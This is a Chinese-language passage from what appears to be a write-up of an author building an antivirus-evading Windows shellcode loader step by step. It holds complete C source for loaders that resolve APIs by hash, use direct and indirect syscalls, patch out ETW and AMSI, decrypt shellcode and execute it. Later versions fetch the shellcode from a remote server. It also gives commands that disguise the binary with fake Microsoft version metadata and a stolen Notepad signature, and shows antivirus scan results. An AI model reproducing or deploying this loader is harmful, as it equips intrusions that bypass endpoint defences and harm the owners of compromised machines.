	myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)
	CreateSyscallStub(ssnAlloc);
	myNtProtectVirtualMemory = (pNtProtectVirtualMemory)
	CreateSyscallStub(ssnProtect);
	if (!myNtAllocateVirtualMemory || !myNtProtectVirtualMemory) return 1;
	
	/* ---------- 第二步：先 Patch ETW ---------- */
	{
		BYTE* pEtwEventWrite = (BYTE*)GetApiByHash(hNtdll, HASH_ETWEVENTWRITE);
		if (pEtwEventWrite) {
			/* 48 33 C0   xor rax, rax   -> 返回 STATUS_SUCCESS
			  C3         ret                                        */
			const BYTE etw_patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
			PatchFunction(pEtwEventWrite, etw_patch, sizeof(etw_patch),
				myNtProtectVirtualMemory);
		}
	}
	
	/* ---------- 第三步：加载 amsi.dll 再 Patch AMSI ---------- */
	{
		HMODULE hAmsi = GetModuleByHash(HASH_AMSI);
		if (hAmsi == NULL) {
			/* amsi.dll 在普通进程中未加载，必须手动加载 */
			hAmsi = LoadLibraryA("amsi.dll");
		}
		if (hAmsi) {
			BYTE* pAmsiScanBuffer = (BYTE*)GetApiByHash(hAmsi, HASH_AMSISCANBUFFER);
			if (pAmsiScanBuffer) {
				/* B8 57 00 07 80   mov eax, 0x80070057  -> E_INVALIDARG
				  C3               ret                                        */
				const BYTE amsi_patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
				PatchFunction(pAmsiScanBuffer, amsi_patch, sizeof(amsi_patch),
					myNtProtectVirtualMemory);
			}
		}
	}
	
	/* ---------- 第四步：分配 Shellcode 内存 ---------- */
	exec_mem = NULL;
	region_size = shellcode_len;
	status = myNtAllocateVirtualMemory(
		NtCurrentProcess(), &exec_mem, 0, &region_size,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) return 1;
	
	/* ---------- 第五步：复制 + XOR 解密 ---------- */
	memcpy(exec_mem, shellcode, shellcode_len);
	xor_decrypt((unsigned char*)exec_mem, shellcode_len, XOR_KEY);
	
	/* ---------- 第六步：改为可执行 ---------- */
	status = myNtProtectVirtualMemory(
		NtCurrentProcess(), &exec_mem, &region_size,
		PAGE_EXECUTE_READ, &old_protect);
	if (!NT_SUCCESS(status)) return 1;
	
	/* ---------- 第七步：执行 ---------- */
	((void(*)())exec_mem)();
	
	return 0;
}
```

火绒右键扫描
![image-20260924140547518](README/image-20260924140547518.png)

动态查杀
![image-20260924140615721](README/image-20260924140615721.png)

360右键扫描
![image-20260924140650911](README/image-20260924140650911.png)

动态可以运行
![image-20260924140758449](README/image-20260924140758449.png)

vt扫描

![image-20260924140917504](README/image-20260924140917504.png)

# 0x05

PE结构伪装

从0x04可以看见360QVM引擎主要针对的是静态特征，通过分析静态特征可以判定为恶意文件，而火绒恰恰相反，主要靠内存扫描

伪装成合法的软件，添加图标

```cmd
rcedit.exe learn5.exe --set-icon my_icon.ico
```

![image-20260924142249465](README/image-20260924142249465.png)

添加版本信息

```cmd
rcedit.exe learn5.exe ^
  --set-version-string "CompanyName" "Microsoft Corporation" ^
  --set-version-string "FileDescription" "Windows Update Service" ^
  --set-version-string "ProductName" "Windows Update" ^
  --set-version-string "FileVersion" "10.0.19041.1" ^
  --set-version-string "ProductVersion" "10.0.19041.1" ^
  --set-version-string "LegalCopyright" "© Microsoft Corporation"
```

![image-20260924142347961](README/image-20260924142347961.png)

进行签名找一个微软签名的程序比如记事本

```cmd
python sigthief.py -i  Notepad.exe -t learn5.exe -o learn5_signed.exe
```

![image-20260924143055299](README/image-20260924143055299.png)

可以看见VT扫描出来的特征减少了

![image-20260924143541416](README/image-20260924143541416.png)

但是360和火绒和之前一样进行拦截

![image-20260924143409482](README/image-20260924143409482.png)

![image-20260924143335268](README/image-20260924143335268.png)

XOR单字节0XAA异或很容易被枚举出来 现在升级一下shellcode的加密算法再次测试发现和上述情况一样，可以看见到这里如果不让shellcode和加载器进行分离的话基本上都会被拦截

# 0x06

shellcode 分离，通过动态下载来获取shellcode避免直接硬编码在loader中

```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <intrin.h>
#include "aes.h"
#include "config.h"      // 由 prepare_payload.py 生成

#pragma comment(lib, "ws2_32.lib")

/* ========== 类型定义 ========== */
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() ((HANDLE)-1)

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG      Length;
	BOOLEAN    Initialized;
	PVOID      SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY     InLoadOrderLinks;
	LIST_ENTRY     InMemoryOrderLinks;
	LIST_ENTRY     InInitializationOrderLinks;
	PVOID          DllBase;
	PVOID          EntryPoint;
	ULONG          SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
	BYTE           InheritedAddressSpace;
	BYTE           ReadImageFileExecOptions;
	BYTE           BeingDebugged;
	BYTE           BitField;
	DWORD          Padding0;
	HANDLE         Mutant;
	PVOID          ImageBaseAddress;
	PPEB_LDR_DATA  Ldr;
} PEB, *PPEB;

typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(
	HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(
	HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

/* ========== 哈希常量 ========== */
#define HASH_NTDLL          0xCEF6E822
#define HASH_NTALLOCATE     0xD33BCABD
#define HASH_NTPROTECT      0x8C394D89
#define HASH_ETWEVENTWRITE  0x2047C3EE
#define HASH_AMSISCANBUFFER 0x9550151E
#define HASH_AMSI           0xE11AB5C5

/* ========== 全局变量 ========== */
static pNtAllocateVirtualMemory g_NtAllocateVirtualMemory;
static pNtProtectVirtualMemory  g_NtProtectVirtualMemory;

/* ========== ROR13 哈希 ========== */
static DWORD hash_ror13(const char* str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << 19);
		h += (BYTE)*str++;
	}
	return h;
}

/* ========== PEB 遍历 ========== */
HMODULE GetModuleByHash(DWORD moduleHash) {
	PPEB peb = (PPEB)__readgsqword(0x60);
	PEB_LDR_DATA* ldr = peb->Ldr;
	LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
	LIST_ENTRY* current = head->Flink;
	
	while (current != head) {
		LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(
			current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		UNICODE_STRING* name = &entry->BaseDllName;
		char ansi_name[128] = {0};
		int len = name->Length / sizeof(WCHAR);
		int i;
		if (len > 127) len = 127;
		for (i = 0; i < len; i++) {
			WCHAR c = name->Buffer[i];
			if (c >= L'A' && c <= L'Z') c += 32;
			ansi_name[i] = (char)c;
		}
		if (hash_ror13(ansi_name) == moduleHash)
			return (HMODULE)entry->DllBase;
		current = current->Flink;
	}
	return NULL;
}

/* ========== 导出表查找 ========== */
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
		(BYTE*)hModule + dosHeader->e_lfanew);
	DWORD exportRva = ntHeaders->OptionalHeader
	.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportRva == 0) return NULL;
	
	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(
		(BYTE*)hModule + exportRva);
	DWORD* names     = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
	WORD*  ordinals  = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
	DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
	
	DWORD i;
	for (i = 0; i < exportDir->NumberOfNames; i++) {
		const char* apiName = (const char*)hModule + names[i];
		if (hash_ror13(apiName) == targetHash)
			return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
	}
	return NULL;
}

/* ========== Hell's Gate ========== */
DWORD GetSSN(HMODULE hNtdll, DWORD funcHash) {
	BYTE* funcAddr = (BYTE*)GetApiByHash(hNtdll, funcHash);
	if (!funcAddr) return 0;
	if (funcAddr[0] == 0xE9) return 0;
	if (funcAddr[0] != 0x4C || funcAddr[1] != 0x8B || funcAddr[2] != 0xD1)
		return 0;
	return *(DWORD*)(funcAddr + 4);
}

/* ========== Syscall Stub ========== */
void* CreateSyscallStub(DWORD ssn) {
	BYTE* stub = (BYTE*)VirtualAlloc(NULL, 12,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!stub) return NULL;
	stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
	stub[3] = 0xB8;
	*(DWORD*)(stub + 4) = ssn;
	stub[8] = 0x0F; stub[9] = 0x05;
	stub[10] = 0xC3;
	stub[11] = 0x00;
	return stub;
}

/* ========== Patch 函数 ========== */
BOOL PatchFunction(BYTE* targetAddr, const BYTE* patchBytes, SIZE_T patchSize) {
	SIZE_T region_size = 4096;
	ULONG old_protect = 0;
	PVOID addr = targetAddr;
	
	NTSTATUS status = g_NtProtectVirtualMemory(
		NtCurrentProcess(), &addr, &region_size,
		PAGE_READWRITE, &old_protect);
	if (!NT_SUCCESS(status)) return FALSE;
	
	memcpy(targetAddr, patchBytes, patchSize);
	
	addr = targetAddr;
	region_size = 4096;
	g_NtProtectVirtualMemory(NtCurrentProcess(), &addr, &region_size,
		old_protect, &old_protect);
	return TRUE;
}

/* ========== AES-CBC 解密 ========== */
void aes_decrypt_buffer(unsigned char* data, size_t len,
	unsigned char* key, unsigned char* iv) {
		struct AES_ctx ctx;
		AES_init_ctx_iv(&ctx, key, iv);
		AES_CBC_decrypt_buffer(&ctx, data, len);
	}

/* ========== HTTP 下载（无 HTTP 头处理，服务器直接返回二进制）========== */
DWORD DownloadPayload(const char* host, const char* port,
	unsigned char* out_buf, DWORD max_size) {
		WSADATA wsaData;
		SOCKET sock = INVALID_SOCKET;
		struct addrinfo* result = NULL;
		struct addrinfo hints;
		DWORD total = 0;
		int ret;
		
		/* 初始化 Winsock */
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
			return 0;
		
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family   = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;
		
		/* 解析地址 */
		if (getaddrinfo(host, port, &hints, &result) != 0) {
			WSACleanup();
			return 0;
		}
		
		/* 连接 */
		struct addrinfo* ptr;
		for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
			sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			if (sock == INVALID_SOCKET) continue;
			
			if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
				break;
			
			closesocket(sock);
			sock = INVALID_SOCKET;
		}
		freeaddrinfo(result);
		
		if (sock == INVALID_SOCKET) {
			WSACleanup();
			return 0;
		}
		
		/* 发送请求（内容随意，服务器不解析） */
		const char* req = "GET /update.bin HTTP/1.0\r\n\r\n";
		send(sock, req, (int)strlen(req), 0);
		shutdown(sock, SD_SEND);
		
		/* 接收数据 */
		while (total < max_size) {
			ret = recv(sock, (char*)out_buf + total, max_size - total, 0);
			if (ret <= 0) break;
			total += ret;
		}
		
		closesocket(sock);
		WSACleanup();
		return total;
	}

/* ========== 主函数 ========== */
int main(void) {
	HMODULE hNtdll;
	DWORD ssnAlloc, ssnProtect;
	PVOID exec_mem = NULL;
	SIZE_T region_size;
	ULONG old_protect = 0;
	NTSTATUS status;
	
	/* 下载缓冲区 */
	static unsigned char payload_buf[2 * 1024 * 1024];  /* 2MB 上限 */
	DWORD payload_size;
	
	/* 解密后的配置 */
	unsigned char config_plain[256] = {0};
	char host[64]   = {0};
	char port[16]   = {0};
	
	/* ---------- 1. 初始化 syscall ---------- */
	hNtdll = GetModuleByHash(HASH_NTDLL);
	if (hNtdll == NULL) return 1;
	
	ssnAlloc   = GetSSN(hNtdll, HASH_NTALLOCATE);
	ssnProtect = GetSSN(hNtdll, HASH_NTPROTECT);
	if (ssnAlloc == 0 || ssnProtect == 0) return 1;
	
	g_NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)
	CreateSyscallStub(ssnAlloc);
	g_NtProtectVirtualMemory = (pNtProtectVirtualMemory)
	CreateSyscallStub(ssnProtect);
	if (!g_NtAllocateVirtualMemory || !g_NtProtectVirtualMemory) return 1;
	
	/* ---------- 2. Patch ETW ---------- */
	{
		BYTE* pEtw = (BYTE*)GetApiByHash(hNtdll, HASH_ETWEVENTWRITE);
		if (pEtw) {
			const BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
			PatchFunction(pEtw, patch, sizeof(patch));
		}
	}
	
	/* ---------- 3. Patch AMSI ---------- */
	{
		HMODULE hAmsi = GetModuleByHash(HASH_AMSI);
		if (hAmsi == NULL) hAmsi = LoadLibraryA("amsi.dll");
		if (hAmsi) {
			BYTE* pAmsi = (BYTE*)GetApiByHash(hAmsi, HASH_AMSISCANBUFFER);
			if (pAmsi) {
				const BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
				PatchFunction(pAmsi, patch, sizeof(patch));
			}
		}
	}
	
	/* ---------- 4. 解密配置 ---------- */
	memcpy(config_plain, enc_config, enc_config_len);
	aes_decrypt_buffer(config_plain, enc_config_len, aes_key, config_iv);
	
	/* 解析 "IP|PORT|PATH" 格式 */
	{
		int i = 0, j = 0;
		while (config_plain[i] && config_plain[i] != '|' && j < 63)
			host[j++] = config_plain[i++];
		host[j] = '\0';
		i++;  /* 跳过 '|' */
		j = 0;
		while (config_plain[i] && config_plain[i] != '|' && j < 15)
			port[j++] = config_plain[i++];
		port[j] = '\0';
	}
	
	/* ---------- 5. 下载加密 Shellcode ---------- */
	payload_size = DownloadPayload(host, port, payload_buf, sizeof(payload_buf));
	if (payload_size == 0) return 1;
	
	/* ---------- 6. 分配内存 ---------- */
	region_size = payload_size;
	status = g_NtAllocateVirtualMemory(
		NtCurrentProcess(), &exec_mem, 0, &region_size,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) return 1;
	
	/* ---------- 7. 复制 + AES 解密 ---------- */
	memcpy(exec_mem, payload_buf, payload_size);
	aes_decrypt_buffer((unsigned char*)exec_mem, payload_size, aes_key, aes_iv);
	
	/* ---------- 8. 改权限 ---------- */
	status = g_NtProtectVirtualMemory(
		NtCurrentProcess(), &exec_mem, &region_size,
		PAGE_EXECUTE_READ, &old_protect);
	if (!NT_SUCCESS(status)) return 1;
	
	/* ---------- 9. 执行 ---------- */
	((void(*)())exec_mem)();
	
	return 0;
}
```

![image-20260924160628281](README/image-20260924160628281.png)

# 0x07

间接系统调用，前面0x03采用的是直接系统调用，虽然这样避免了最后调用ntdll一定程度上绕过了一些HOOK，但是在正常情况下返回地址应该指向ntdll.dll 内部相关函数，而且不同版本的SSN都有差别，这样不稳定而且容易被EDR发现是直接系统调用进而判断出是恶意程序，而间接系统调用不自己执行syscall，而是跳转到ntdll.dll 已经有的syscall ret 去执行并且SSN号变成动态获取

```
    代码 → 你的间接跳转存根（设置 r10/rcx/eax）
         → jmp 到 ntdll.dll 中的 syscall; ret Gadget
         → syscall 指令执行，RIP 在 ntdll.dll 内
         → 内核记录返回地址 = ntdll.dll 中的地址 
         → ret 返回到 ntdll.dll 中的地址
         → 你的存根继续，返回到你的调用方
```

Hell's Gate（2020）是第一个实现动态 SSN 解析的技术。它的逻辑是：在 `ntdll.dll` 中找到目标 `Nt*` 函数的地址，读取函数开头的字节。如果字节序列是 `4C 8B D1 B8`（`mov r10, rcx; mov eax, SSN`），那么偏移 +4 处的 4 字节就是 SSN。但是EDR如果进行了hook那么就会导致字节序列变成 jmp xxx 这样就读取失败了，而Halo's Gate（2021，由 Sektor7 的 Reenz0h 提出）的思路是：**如果目标函数被 Hook 了，就去查看它的“邻居”** 。

Windows 中 `ntdll.dll` 的 `Nt*` 函数是**紧密排列**的，且 **SSN 按升序连续分配**。例如：

```
NtCreateFile        SSN = 0x55
NtOpenFile          SSN = 0x56
NtQueryInformationFile  SSN = 0x57
...
NtAllocateVirtualMemory SSN = 0x18  ← 被 Hook 了
NtProtectVirtualMemory  SSN = 0x19  ← 可能未被 Hook
```

如果 `NtAllocateVirtualMemory` 被 Hook，Halo's Gate 会向**上**（更高地址）和**下**（更低地址）扫描，寻找最近的未被 Hook 的 `Nt*` 函数。找到后，根据距离调整 SSN

```c
#include <windows.h>
#include <winhttp.h>
#include <intrin.h>
#include "aes.h"
#include "config.h"

/* ========== 类型定义 ========== */
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() ((HANDLE)-1)

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG      Length;
	BOOLEAN    Initialized;
	PVOID      SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY     InLoadOrderLinks;
	LIST_ENTRY     InMemoryOrderLinks;
	LIST_ENTRY     InInitializationOrderLinks;
	PVOID          DllBase;
	PVOID          EntryPoint;
	ULONG          SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
	BYTE           InheritedAddressSpace;
	BYTE           ReadImageFileExecOptions;
	BYTE           BeingDebugged;
	BYTE           BitField;
	DWORD          Padding0;
	HANDLE         Mutant;
	PVOID          ImageBaseAddress;
	PPEB_LDR_DATA  Ldr;
} PEB, *PPEB;

typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(
	HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(
	HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

/* ========== 哈希常量 ========== */
#define HASH_NTDLL          0xCEF6E822
#define HASH_NTALLOCATE     0xD33BCABD
#define HASH_NTPROTECT      0x8C394D89
#define HASH_ETWEVENTWRITE  0x2047C3EE
#define HASH_AMSISCANBUFFER 0x9550151E
#define HASH_AMSI           0xE11AB5C5

/* ========== 全局变量 ========== */
static pNtAllocateVirtualMemory g_NtAllocateVirtualMemory;
static pNtProtectVirtualMemory  g_NtProtectVirtualMemory;
static PVOID                    g_SyscallGadget = NULL;

/* ========== ROR13 哈希 ========== */
static DWORD hash_ror13(const char* str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << 19);
		h += (BYTE)*str++;
	}
	return h;
}

/* ========== PEB 遍历 ========== */
HMODULE GetModuleByHash(DWORD moduleHash) {
	PPEB peb = (PPEB)__readgsqword(0x60);
	PEB_LDR_DATA* ldr = peb->Ldr;
	LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
	LIST_ENTRY* current = head->Flink;
	
	while (current != head) {
		LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(
			current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		UNICODE_STRING* name = &entry->BaseDllName;
		char ansi_name[128] = {0};
		int len = name->Length / sizeof(WCHAR);
		int i;
		if (len > 127) len = 127;
		for (i = 0; i < len; i++) {
			WCHAR c = name->Buffer[i];
			if (c >= L'A' && c <= L'Z') c += 32;
			ansi_name[i] = (char)c;
		}
		if (hash_ror13(ansi_name) == moduleHash)
			return (HMODULE)entry->DllBase;
		current = current->Flink;
	}
	return NULL;
}

/* ========== 导出表查找 ========== */
FARPROC GetApiByHash(HMODULE hModule, DWORD targetHash) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
		(BYTE*)hModule + dosHeader->e_lfanew);
	DWORD exportRva = ntHeaders->OptionalHeader
	.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportRva == 0) return NULL;
	
	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(
		(BYTE*)hModule + exportRva);
	DWORD* names     = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
	WORD*  ordinals  = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
	DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
	
	DWORD i;
	for (i = 0; i < exportDir->NumberOfNames; i++) {
		const char* apiName = (const char*)hModule + names[i];
		if (hash_ror13(apiName) == targetHash)
			return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
	}
	return NULL;
}

/* ========== Hell's Gate ========== */
DWORD GetSSN(HMODULE hNtdll, DWORD funcHash) {
	BYTE* funcAddr = (BYTE*)GetApiByHash(hNtdll, funcHash);
	if (!funcAddr) return 0;
	if (funcAddr[0] == 0xE9) return 0;
	if (funcAddr[0] != 0x4C || funcAddr[1] != 0x8B || funcAddr[2] != 0xD1)
		return 0;
	return *(DWORD*)(funcAddr + 4);
}

/* ========== 【新增】扫描 ntdll .text 段找 syscall gadget (0F 05 C3) ========== */
PVOID FindSyscallGadget(HMODULE hNtdll) {
	BYTE* base = (BYTE*)hNtdll;
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
	
	WORD i;
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		/* 只看 .text 段 */
		if (memcmp(sections[i].Name, ".text", 5) != 0) continue;
		
		BYTE* start = base + sections[i].VirtualAddress;
		DWORD size = sections[i].Misc.VirtualSize;
		
		DWORD j;
		for (j = 0; j + 3 < size; j++) {
			if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3)
				return (PVOID)(start + j);
		}
	}
	return NULL;
}

/* ========== 【新增】间接系统调用 stub ========== */
/* 结构：
 *   4C 8B D1              mov r10, rcx
 *   B8 XX XX XX XX        mov eax, SSN
 *   FF 25 00 00 00 00     jmp qword ptr [rip+0]
 *   [8字节目标地址]        指向 ntdll 中的 syscall; ret
 * 总长度：22 字节
 */
PVOID CreateIndirectStub(DWORD ssn, PVOID syscallGadget) {
	BYTE* stub = (BYTE*)VirtualAlloc(NULL, 64,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!stub) return NULL;
	
	int o = 0;
	stub[o++] = 0x4C;                                   /* mov r10, rcx */
	stub[o++] = 0x8B;
	stub[o++] = 0xD1;
	stub[o++] = 0xB8;                                   /* mov eax, imm32 */
	*(DWORD*)(stub + o) = ssn; o += 4;
	stub[o++] = 0xFF;                                   /* jmp [rip+0] */
	stub[o++] = 0x25;
	*(DWORD*)(stub + o) = 0; o += 4;                    /* rip 偏移 = 0 */
	*(PVOID*)(stub + o) = syscallGadget; o += 8;        /* 目标地址 */
	
	FlushInstructionCache(GetCurrentProcess(), stub, o);
	return stub;
}

/* ========== Patch 函数 ========== */
BOOL PatchFunction(BYTE* targetAddr, const BYTE* patchBytes, SIZE_T patchSize) {
	SIZE_T region_size = 4096;
	ULONG old_protect = 0;
	PVOID addr = targetAddr;
	
	NTSTATUS status = g_NtProtectVirtualMemory(
		NtCurrentProcess(), &addr, &region_size,
		PAGE_READWRITE, &old_protect);
	if (!NT_SUCCESS(status)) return FALSE;
	
	memcpy(targetAddr, patchBytes, patchSize);
	
	addr = targetAddr;
	region_size = 4096;
	g_NtProtectVirtualMemory(NtCurrentProcess(), &addr, &region_size,
		old_protect, &old_protect);
	return TRUE;
}

/* ========== AES-CBC 解密 ========== */
void aes_decrypt_buffer(unsigned char* data, size_t len,
	unsigned char* key, unsigned char* iv) {
		struct AES_ctx ctx;
		AES_init_ctx_iv(&ctx, key, iv);
		AES_CBC_decrypt_buffer(&ctx, data, len);
	}

/* ========== ASCII 转宽字符 ========== */
static void ascii_to_wide(const char* src, wchar_t* dst, int max_len) {
	int i;
	for (i = 0; src[i] && i < max_len - 1; i++)
		dst[i] = (wchar_t)(unsigned char)src[i];
	dst[i] = 0;
}

/* ========== WinHTTP 下载 ========== */
DWORD DownloadPayload(const char* host, const char* port, const char* path,
	unsigned char* out_buf, DWORD max_size) {
		HINTERNET hSession = NULL;
		HINTERNET hConnect = NULL;
		HINTERNET hRequest = NULL;
		DWORD total = 0;
		DWORD bytes_read = 0;
		wchar_t whost[256] = {0};
		wchar_t wpath[512] = {0};
		int port_num = 0;
		
		int i;
		for (i = 0; port[i]; i++)
			port_num = port_num * 10 + (port[i] - '0');
		
		ascii_to_wide(host, whost, 256);
		ascii_to_wide(path, wpath, 512);
		
		hSession = WinHttpOpen(
			L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		if (!hSession) return 0;
		
		hConnect = WinHttpConnect(hSession, whost, (INTERNET_PORT)port_num, 0);
		if (!hConnect) {
			WinHttpCloseHandle(hSession);
			return 0;
		}
		
		hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath,
			NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
		if (!hRequest) {
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return 0;
		}
		
		if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return 0;
		}
		
		if (!WinHttpReceiveResponse(hRequest, NULL)) {
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
			return 0;
		}
		
		while (total < max_size) {
			DWORD avail = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
			if (avail == 0) break;
			if (avail > max_size - total) avail = max_size - total;
			if (!WinHttpReadData(hRequest, out_buf + total, avail, &bytes_read))
				break;
			if (bytes_read == 0) break;
			total += bytes_read;
		}
		
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return total;
	}

/* ========== 主函数 ========== */
int main(void) {
	HMODULE hNtdll;
	DWORD ssnAlloc, ssnProtect;
	PVOID exec_mem = NULL;
	SIZE_T region_size;
	ULONG old_protect = 0;
	NTSTATUS status;
	
	static unsigned char payload_buf[2 * 1024 * 1024];
	DWORD payload_size;
	
	unsigned char config_plain[256] = {0};
	char host[64] = {0};
	char port[16] = {0};
	char path[256] = {0};
	
	/* ---------- 1. 初始化 syscall ---------- */
	hNtdll = GetModuleByHash(HASH_NTDLL);
	if (hNtdll == NULL) return 1;
	
	ssnAlloc   = GetSSN(hNtdll, HASH_NTALLOCATE);
	ssnProtect = GetSSN(hNtdll, HASH_NTPROTECT);
	if (ssnAlloc == 0 || ssnProtect == 0) return 1;
	
	/* 【新增】先扫描 syscall gadget */
	g_SyscallGadget = FindSyscallGadget(hNtdll);
	if (!g_SyscallGadget) return 1;
	
	/* 【改动】用间接 stub 替代直接 stub */
	g_NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)
	CreateIndirectStub(ssnAlloc, g_SyscallGadget);
	g_NtProtectVirtualMemory = (pNtProtectVirtualMemory)
	CreateIndirectStub(ssnProtect, g_SyscallGadget);
	if (!g_NtAllocateVirtualMemory || !g_NtProtectVirtualMemory) return 1;
	
	/* ---------- 2. Patch ETW ---------- */
	{
		BYTE* pEtw = (BYTE*)GetApiByHash(hNtdll, HASH_ETWEVENTWRITE);
		if (pEtw) {
			const BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
			PatchFunction(pEtw, patch, sizeof(patch));
		}
	}
	
	/* ---------- 3. Patch AMSI ---------- */
	{
		HMODULE hAmsi = GetModuleByHash(HASH_AMSI);
		if (hAmsi == NULL) hAmsi = LoadLibraryA("amsi.dll");
		if (hAmsi) {
			BYTE* pAmsi = (BYTE*)GetApiByHash(hAmsi, HASH_AMSISCANBUFFER);
			if (pAmsi) {
				const BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
				PatchFunction(pAmsi, patch, sizeof(patch));
			}
		}
	}
	
	/* ---------- 4. 解密配置 ---------- */
	memcpy(config_plain, enc_config, enc_config_len);
	aes_decrypt_buffer(config_plain, enc_config_len, aes_key, config_iv);
	
	/* 解析 "IP|PORT|PATH"（过滤 PKCS7 填充字节） */
	{
		int i = 0, j = 0;
		
		j = 0;
		while (config_plain[i] && j < 63) {
